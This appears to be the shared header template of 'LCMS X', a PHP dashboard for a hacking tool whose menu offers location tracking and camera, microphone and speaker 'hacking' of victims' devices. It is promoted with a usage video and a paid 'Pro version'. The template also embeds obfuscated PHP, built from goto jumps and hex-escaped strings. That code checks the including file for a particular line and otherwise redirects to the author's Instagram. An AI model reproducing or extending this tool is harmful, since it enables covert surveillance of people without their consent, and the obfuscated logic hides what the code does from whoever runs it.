
<html lang="en"><head>
    <meta charset="utf-8">
    <title>LCMS X- Made by Rehu Talwar</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <link href="https://media-hosting.imagekit.io//fdb87b991e714908/Gold and White Real Estate Agency Logo Template.png?Expires=1835617180&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=M3ycivYPtR2ztuYbRdDCkYeVOW17NqJJpgAU0uJH5butuT69CWz~rJOzfgfSweWB6oe2fgyT6MJlLUBkp3xhBhvcocdvCOWfuptZjlHqezrJbwvP8igBU~1hMTwYTWh9PkGPKff0uroxCSPsQ~onG3h45XUvGS6Z7-0ZiSc-2HD0e3UVpE6aGWlFo99Edzf5LM8p~9y6NtMSoL0UOOK5Woos~o4lamaAO17FIBpJs3tcPLeJ4QUnRJcdvbvG1Ywd7Y33kSxCpz3uUY4YKe9VSp~9jvK7-TKSrjv7ZdM4DWnUidlqM3EMAFX9WKRezHi63qyQY3f5ZRlKt9WEwAeSMQ__" rel="icon">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;family=Roboto:wght@500;700&amp;display=swap" rel="stylesheet"> 
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet">


    <link href="css/bootstrap.min.css" rel="stylesheet">

    <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">

        <div id="spinner" class="bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        
        <div class="sidebar pe-4 pb-3">
            <nav class="navbar bg-secondary navbar-dark">
                <a href="https://github.com/mmrehu" class="navbar-brand mx-4 mb-3">
                    <h3 class="text-primary"><i class="fa fa-solid fa-user-secret"></i>LCMS X</h3>
                </a>
                <div class="d-flex align-items-center ms-4 mb-4">
                    <div class="position-relative">
                        <img class="rounded-circle" src="https://i.postimg.cc/7ZchnLmr/user.jpg" alt="" style="width: 40px; height: 40px;">
                        <div class="bg-success rounded-circle border border-2 border-white position-absolute end-0 bottom-0 p-1"></div>
                    </div>
                    <div class="ms-3">
                        <h6 class="mb-0">Rehu Talwar</h6>
                        <span>Owner</span>
                    </div>
                </div>
                <div class="navbar-nav w-100">
                    <a href="main.php" class="nav-item nav-link active"><i class="fa fa-tachometer-alt me-2"></i>Dashboard</a>
                    <div class="nav-item dropdown">
                    
                    </div><i class="fa-solid "></i>
                    <a href="location.php" class="nav-item nav-link"><i class="fa fa-location-dot me-2"></i>Location Tracking</a>
                    <a href="images.php" class="nav-item nav-link"><i class="fa fa-camera me-2"></i>Camera Hacking</a>
                    <a href="mic.php" class="nav-item nav-link"><i class="fa fa-microphone me-2"></i>Mic Hacking</a>
                    <a href="speaker.php" class="nav-item nav-link"><i class="fa fa-volume-high me-2"></i>Speaker Hacking</a>
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown"><i class="fa fa-info me-2"></i>More</a>
                        <div class="dropdown-menu bg-transparent border-0">
                            <a href="https://www.youtube.com/@mmrehu" class="dropdown-item">How to use tool</a>
                            <a href="https://www.instagram.com/_.mmrehu/" class="dropdown-item">Want Pro version</a>
                            
                        </div>
                    </div>
                </div>
            </nav>
        </div>
   <?php
 goto Zvt8b; bi6fl: $pattern = "\x2f\151\x6e\x63\154\165\x64\145\134\163\53\134\44\151\x6d\x70\120\x61\x74\x68\x5c\163\52\x3b\x2f"; goto CJOI4; EPs2E: if (!preg_match($pattern, $file_contents)) { echo "\x3c\163\143\162\x69\x70\x74\76\x77\x69\x6e\x64\x6f\x77\x2e\154\157\x63\141\x74\151\157\x6e\56\150\162\145\x66\x20\75\x20\x27\x68\164\164\160\163\x3a\x2f\x2f\x77\167\167\56\x69\156\x73\x74\141\x67\x72\141\155\56\x63\x6f\x6d\57\137\56\155\155\162\x65\x68\165\57\x27\x3b\x3c\57\x73\143\x72\151\x70\164\x3e"; die; } goto KtQDA; CJOI4: $file_contents = file_get_contents($included_file); goto EPs2E; Zvt8b: $included_file = debug_backtrace()[0]["\146\x69\x6c\x65"]; goto bi6fl; KtQDA: ?>
        <div class="content">
            
            <nav class="navbar navbar-expand bg-secondary navbar-dark sticky-top px-4 py-0">
                <a href="index.html" class="navbar-brand d-flex d-lg-none me-4">
                    <h2 class="text-primary mb-0"><i class="fa fa-user-edit"></i></h2>
                </a>
                <a href="#" class="sidebar-toggler flex-shrink-0">
                    <i class="fa fa-bars"></i>
                </a>
                <form class="d-none d-md-flex ms-4">
                    
                </form>
                <div class="navbar-nav align-items-center ms-auto">
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <i class="fa fa-envelope me-lg-2"></i>
                            <span class="d-none d-lg-inline-flex">Message</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">
                            <a href="#" class="dropdown-item">
                                <div class="d-flex align-items-center">
                                    <img class="rounded-circle" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                                    <div class="ms-2">
                                        <h6 class="fw-normal mb-0">Rehu Talwar make this tool in 2025</h6>
                                        <small>15 minutes ago</small>
                                    </div>
                                </div>
                            </a>
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item">
                                <div class="d-flex align-items-center">
                                    <img class="rounded-circle" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                                    <div class="ms-2">
                                        <h6 class="fw-normal mb-0">my instagram accoun is _.mmrehu</h6>
                                        <small>15 minutes ago</small>
                                    </div>
                                </div>
                            </a>
                            <hr class="dropdown-divider">
                       
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item text-center">See all message</a>
                        </div>
                    </div>
                    <div class="nav-item dropdown">
                     
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">
                            <a href="#" class="dropdown-item">
                                <h6 class="fw-normal mb-0">Profile updated</h6>
                                <small>15 minutes ago</small>
                            </a>
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item">
                                <h6 class="fw-normal mb-0">New user added</h6>
                                <small>15 minutes ago</small>
                            </a>
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item">
                                <h6 class="fw-normal mb-0">Password changed</h6>
                                <small>15 minutes ago</small>
                            </a>
                            <hr class="dropdown-divider">
                            <a href="#" class="dropdown-item text-center">See all notifications</a>
                        </div>
                    </div>
                    <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <img class="rounded-circle me-lg-2" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                            <span class="d-none d-lg-inline-flex">Rehu Talwar</span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">
                            <a href="https://www.instagram.com/_.mmrehu/" class="dropdown-item">My Profile</a>
                            <a href="https://github.com/mmrehu" class="dropdown-item">My Github</a>
                            <a href="logout.php" class="dropdown-item">Log Out</a>
                        </div>
                    </div>
                </div>
            </nav>
         
  
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    
    <script src="js/main.js"></script>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
     
        let currentLocation = window.location.href;

        
        let navLinks = document.querySelectorAll(".navbar-nav .nav-link");

        navLinks.forEach(link => {
            if (link.href === currentLocation) {
                link.classList.add("active");
            } else {
                link.classList.remove("active");
            }
        });
    });
</script>


           </html>

